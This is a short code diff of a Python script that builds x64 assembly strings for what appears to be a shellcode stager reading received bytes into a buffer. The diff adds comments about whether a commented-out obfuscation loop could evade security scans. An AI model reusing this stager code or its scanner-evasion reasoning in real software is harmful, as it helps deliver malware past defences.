@@ -375,11 +375,10 @@ def main():
         "   xor rax, rax                    ;"
         "   mov ax, word ptr [rsi]          ;"
         
-        
-        
+        # Doubt this will work because what's in mem is already there, scans will pick it up
+        # before any obf happens
         #"   xor rdi, rdi                    ;"
         #"   add rdi, 0x1                    ;"  # Counter
-        
         
         #" obfuscate_byte:                   ;"
         #"   dec rdi                         ;"
@@ -388,15 +387,10 @@ def main():
         #"   mov [r13+rdi], dl               ;"
         #"   test rdi, rdi                   ;"
         #"   jnz obfuscate_byte              ;"
-        
-        
 
         " shift_buffer:                     ;"
         "   add r13, rax                    ;"  # Add bytes read to R13, buffer shitfs to position for next read
         "   add r15, rax                    ;"  # This is total bytes received so far
-        
-        
-        
         
         " check_bytes_read:                 "
         "   cmp eax, 0x0                    ;"  # Check if there's any bytes read
